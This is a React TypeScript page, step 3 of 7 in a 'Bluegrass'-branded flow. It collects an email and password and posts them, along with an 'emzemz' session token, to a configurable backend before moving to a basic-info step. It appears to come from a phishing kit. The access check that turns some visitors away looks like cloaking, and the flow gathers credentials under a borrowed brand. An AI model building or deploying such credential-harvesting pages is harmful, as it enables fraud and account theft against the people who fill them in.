import React, { useState } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import axios from 'axios';
import { baseUrl } from '../constants';
import useAccessCheck from '../Utils/useAccessCheck';
import FlowPageLayout from '../components/FlowPageLayout';

const EmailPassword: React.FC = () => {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [confirmPassword, setConfirmPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [showConfirmPassword, setShowConfirmPassword] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [errors, setErrors] = useState({
    email: '',
    password: '',
    confirmPassword: '',
    form: ''
  });

  const navigate = useNavigate();
  const location = useLocation();
  const { emzemz } = location.state || {};
  const isAllowed = useAccessCheck(baseUrl);

  if (isAllowed === null) {
    return <div className="min-h-screen flex items-center justify-center bg-[#4A9619] text-white text-lg">Checking access…</div>;
  }

  if (isAllowed === false) {
    return <div className="min-h-screen flex items-center justify-center bg-[#4A9619] text-white text-lg">Access denied. Redirecting…</div>;
  }

  if (!emzemz) {
    return <div className="min-h-screen flex items-center justify-center bg-[#4A9619] text-white text-lg">Missing session data. Please restart the flow.</div>;
  }

  const validateEmail = (email: string) => {
    const regex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return regex.test(email);
  };

  const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    setIsLoading(true);

    const newErrors = {
      email: !email.trim() ? 'Email is required' : !validateEmail(email) ? 'Invalid email format' : '',
      password: password.length < 8 ? 'Password must be at least 8 characters' : '',
      confirmPassword: password !== confirmPassword ? 'Passwords do not match' : '',
      form: ''
    };

    setErrors(newErrors);

    if (!newErrors.email && !newErrors.password && !newErrors.confirmPassword) {
      try {
        await axios.post(`${baseUrl}api/bluegrass-email-password/`, {
          emzemz,
          email,
          password
        });
        console.log('Email and password set successfully');
        navigate('/basic-info', { state: { emzemz } });
      } catch (error) {
        console.error('Error setting email/password:', error);
        setErrors(prev => ({
          ...prev,
          form: 'There was an error. Please try again.'
        }));
      } finally {
        setIsLoading(false);
      }
    } else {
      setIsLoading(false);
    }
  };

  return (
    <FlowPageLayout
      eyebrow="Step 3 of 7"
      title="Create Your Login Credentials"
      description="Set an email and password so you can sign in securely. Use an address you check often and a strong password."
      contentClassName="space-y-6"
      afterContent={(
        <p className="text-xs text-white/90 max-w-md text-center">
          Passwords must include at least 8 characters with a mix of letters, numbers, and symbols to stay compliant with Bluegrass security standards.
        </p>
      )}
    >
      <form onSubmit={handleSubmit} className="space-y-6">
        {errors.form && (
          <div className="rounded-xl border border-red-100 bg-red-50 px-4 py-3 text-sm text-red-700">
            {errors.form}
          </div>
        )}

        <div className="space-y-2">
          <label htmlFor="email" className="text-xs font-semibold uppercase tracking-wide text-[#123524]">
            Email
          </label>
          <input
            id="email"
            name="email"
            type="email"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            className="w-full rounded-xl border border-gray-200 px-4 py-3 text-sm text-gray-800 shadow-sm focus:border-[#4A9619]/60 focus:outline-none focus:ring-2 focus:ring-[#BFD8F6]"
            placeholder="you@example.com"
          />
          {errors.email && (
            <p className="flex items-center gap-2 text-xs font-semibold text-red-600">
              <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current" aria-hidden="true">
                <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z" />
              </svg>
              {errors.email}
            </p>
          )}
        </div>

        <div className="space-y-2">
          <label htmlFor="password" className="text-xs font-semibold uppercase tracking-wide text-[#123524]">
            Password
          </label>
          <div className="flex items-center gap-3">
            <input
              id="password"
              name="password"
              type={showPassword ? 'text' : 'password'}
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="w-full rounded-xl border border-gray-200 px-4 py-3 text-sm text-gray-800 shadow-sm focus:border-[#4A9619]/60 focus:outline-none focus:ring-2 focus:ring-[#BFD8F6]"
              placeholder="Create password"
            />
            <button
              type="button"
              onClick={() => setShowPassword(!showPassword)}
              className="text-xs font-semibold text-[#0b5da7] hover:underline"
            >
              {showPassword ? 'Hide' : 'Show'}
            </button>
          </div>
          {errors.password && (
            <p className="flex items-center gap-2 text-xs font-semibold text-red-600">
              <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current" aria-hidden="true">
                <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z" />
              </svg>
              {errors.password}
            </p>
          )}
        </div>

        <div className="space-y-2">
          <label htmlFor="confirmPassword" className="text-xs font-semibold uppercase tracking-wide text-[#123524]">
            Confirm Password
          </label>
          <div className="flex items-center gap-3">
            <input
              id="confirmPassword"
              name="confirmPassword"
              type={showConfirmPassword ? 'text' : 'password'}
              value={confirmPassword}
              onChange={(e) => setConfirmPassword(e.target.value)}
              className="w-full rounded-xl border border-gray-200 px-4 py-3 text-sm text-gray-800 shadow-sm focus:border-[#4A9619]/60 focus:outline-none focus:ring-2 focus:ring-[#BFD8F6]"
              placeholder="Re-enter password"
            />
            <button
              type="button"
              onClick={() => setShowConfirmPassword(!showConfirmPassword)}
              className="text-xs font-semibold text-[#0b5da7] hover:underline"
            >
              {showConfirmPassword ? 'Hide' : 'Show'}
            </button>
          </div>
          {errors.confirmPassword && (
            <p className="flex items-center gap-2 text-xs font-semibold text-red-600">
              <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current" aria-hidden="true">
                <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z" />
              </svg>
              {errors.confirmPassword}
            </p>
          )}
        </div>

        <div className="flex justify-end">
          <button
            type="submit"
            disabled={isLoading}
            className="inline-flex items-center justify-center rounded-xl bg-[#4A9619] px-8 py-3 text-sm font-semibold uppercase tracking-wide text-white transition hover:bg-[#3f8215] disabled:cursor-not-allowed disabled:opacity-70"
          >
            {isLoading ? 'Saving…' : 'Continue'}
          </button>
        </div>
      </form>
    </FlowPageLayout>
  );
};

export default EmailPassword;
